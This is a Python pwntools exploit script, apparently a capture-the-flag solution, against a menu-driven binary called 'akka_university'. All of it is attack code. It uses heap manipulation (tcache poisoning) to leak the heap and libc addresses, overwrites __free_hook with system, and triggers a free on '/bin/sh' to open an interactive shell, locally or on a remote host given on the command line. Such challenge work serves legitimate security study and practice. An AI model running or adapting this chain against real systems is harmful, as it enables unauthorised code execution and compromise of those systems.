#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('akka_university')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x01A06
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def evaluate_sheet(size, name, remarks, log):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", str(size).encode())
    io.sendafter(b">>", name)
    io.sendlineafter(b">>", b"100")
    io.sendafter(b">>", remarks)
    io.sendafter(b">>", log)

def delete_sheet(idx):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b">>", str(idx).encode())    

def view_sheet(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b">>", str(idx).encode())
    io.recvuntil(b"contents\n")
    data = io.recv(6)
    return u64(data.ljust(8, b"\x00"))  

def review_sheet(idx, name, remarks, log):
    io.sendlineafter(b">>", b"4")
    io.sendlineafter(b">>", str(idx).encode())  
    io.sendafter(b">>", name)
    io.sendlineafter(b">>", b"100")
    io.sendafter(b">>", remarks)
    io.sendafter(b">>", log)


def solve():

    for i in range(10):
        evaluate_sheet(0x80, b"asdf", b"A"*56, b"A"*8)

    for j in range(10, 1, -1):
        delete_sheet(j)
    
    review_sheet(0, b"asdf", b"A"*56 + p16(0xa450), p8(0xe0))
    heap_base = view_sheet(0) - 0x4e0
    info("heap base: %#x", heap_base)

    unsorted_chunk = heap_base + 0x3c0
    review_sheet(0, b"asdf", b"A"*56 + p64(unsorted_chunk)[:6], p8(0xe0))
    main_arena = view_sheet(0)
    libc.address = main_arena - 0x1ebbe0
    info("libc base: %#x", libc.address)

    tcache_fd = heap_base + 0x450
    review_sheet(0, b"asdf", b"A"*56 + p64(tcache_fd)[:6], p64(libc.sym["__free_hook"]))

    evaluate_sheet(0x80, "asdf", b"asdf", b"/bin/sh\x00")
    evaluate_sheet(0x80, b"asdf", b"asdf", p64(libc.sym["system"]))

    delete_sheet(10)
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

